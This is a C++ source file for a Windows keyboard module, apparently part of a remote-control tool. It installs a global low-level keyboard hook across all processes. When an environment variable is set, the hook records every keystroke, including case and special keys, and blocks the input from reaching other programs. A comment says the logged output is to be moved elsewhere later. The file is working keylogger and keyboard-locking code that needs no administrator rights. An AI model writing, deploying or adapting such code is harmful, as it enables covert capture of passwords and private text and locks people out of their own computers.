#include "keyboard.h"

#define KB_ENV L"RCDO_KBLOCK" // name of environment variable to search for

// map to track keystrokes that cannot be mapped with MapVirtualKeyExW
std::map<int, std::wstring> mapSpecialKeys = { 
	{VK_BACK, L"[BACKSPACE]" },
	{VK_RETURN,	L"\n" },
	{VK_SPACE,	L"_" },
	{VK_TAB,	L"[TAB]" },
	{VK_CONTROL,	L"[CONTROL]" },
	{VK_LCONTROL,	L"[CONTROL]" },
	{VK_RCONTROL,	L"[CONTROL]" },
	{VK_MENU,	L"[ALT]" },
	{VK_LWIN,	L"[LWIN]" },
	{VK_RWIN,	L"[RWIN]" },
	{VK_ESCAPE,	L"[ESCAPE]" },
	{VK_END,	L"[END]" },
	{VK_HOME,	L"[HOME]" },
	{VK_LEFT,	L"[LEFT]" },
	{VK_RIGHT,	L"[RIGHT]" },
	{VK_UP,		L"[UP]" },
	{VK_DOWN,	L"[DOWN]" },
	{VK_PRIOR,	L"[PG_UP]" },
	{VK_NEXT,	L"[PG_DOWN]" },
	{VK_OEM_PERIOD,	L"." },
	{VK_DECIMAL,	L"." },
	{VK_OEM_PLUS,	L"+" },
	{VK_OEM_MINUS,	L"-" },
	{VK_ADD,		L"+" },
	{VK_SUBTRACT,	L"-" },
};

HHOOK ghHook;
KBDLLHOOKSTRUCT kbdStruct;

// stores booleans for letter casing
// caseStatus.first is the SHIFT key status
// caseStatus.second is the CapsLock key status

// +-------+------+------+
// | SHIFT | CAPS | CASE |
// +-------+------+------+
// |     0 |    0 |    0 |
// |     0 |    1 |    1 |
// |     1 |    0 |    1 |
// |     1 |    1 |    0 |
// +-------+------+------+
std::pair<bool, bool> caseStatus = std::make_pair<bool, bool>(0, 0);

int KeyboardMod::requireAdmin() {
    return 0;
}

void KeyboardMod::start() {

    if(setHook()) {
        return;
    }

    wprintf(L"Hook successfully installed!\n");

    MSG msg;
    while(GetMessage(&msg, NULL, 0, 0)) {
    }

}

void KeyboardMod::kill() {

    releaseHook();

}

bool setHook() {

    // set the keyboard hook for all processes on the computer
    // runs the hookCallback function when hooked is triggered
    if(!(ghHook = SetWindowsHookExW(WH_KEYBOARD_LL, hookCallback, NULL, 0))) {
        wprintf(L"%s: %d\n", "Hooked failed to install with error code", GetLastError());

        return 1;
    }

    return 0;

}

bool releaseHook() {

    return UnhookWindowsHookEx(ghHook);

}

void logKeystroke(int vkCode) {
    // KBDLLHOOKSTRUCT stores the keyboard inputs as Virtual-Key codes
    // resolution and logging of the keystrokes is performed here
    // also ignores mouse inputs

    if(mapSpecialKeys.find(vkCode) != mapSpecialKeys.end()){
        std::wstring key = mapSpecialKeys.at(vkCode);

        std::wcout << key << std::endl;
    }

    else {
        
        HKL kbLayout = GetKeyboardLayout(GetCurrentProcessId());

        char key = MapVirtualKeyExW(vkCode, MAPVK_VK_TO_CHAR, kbLayout);
        key = (caseStatus.first ^ caseStatus.second) ? key: tolower(key);

        // print to test functionality, MUST move to another location eventually
        wprintf(L"%c\n", key);

    }
}

LRESULT __stdcall hookCallback(int nCode, WPARAM wParam, LPARAM lParam) {
    // function handler for all keyboard strokes

    std::wstring buffer = getEnvVar(KB_ENV, L"0");

    long int keyboardLocked = wcstol(buffer.c_str(), NULL, 2);

    if(keyboardLocked) {
        if(nCode >= 0) {
            kbdStruct = *((KBDLLHOOKSTRUCT*)lParam);
            int vkCode = kbdStruct.vkCode;

            if(wParam == WM_KEYDOWN) {
                if(vkCode == VK_SHIFT || vkCode == VK_LSHIFT || vkCode == VK_RSHIFT) { 
                    caseStatus.first = 1;
                    return 1;
                }

                if(vkCode == VK_CAPITAL) {
                    caseStatus.second = !caseStatus.second;
                    return 1;
                }

                logKeystroke(vkCode);
            }
            
            if(wParam == WM_KEYUP) {
                if(vkCode == VK_SHIFT || vkCode == VK_LSHIFT || vkCode == VK_RSHIFT) { 
                    caseStatus.first = 0;
                    return 1;
                }
            }
        }

        // returns a non-zero value if the keyboard is locked to prevent the input from reaching other processes
        return 1;
    }

    return CallNextHookEx(ghHook, nCode, wParam, lParam);
}